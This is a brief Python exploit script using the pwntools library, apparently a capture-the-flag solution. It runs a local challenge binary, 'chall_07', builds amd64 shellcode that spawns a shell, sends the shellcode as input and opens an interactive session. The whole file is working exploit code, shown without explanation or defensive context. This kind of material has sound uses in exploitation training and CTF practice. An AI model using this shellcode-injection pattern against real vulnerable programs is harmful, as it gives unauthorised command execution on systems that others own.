# coding: utf-8
from pwn import *
p = process("./chall_07")
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
p.recv()
p.sendline(shellcode)
p.interactive()
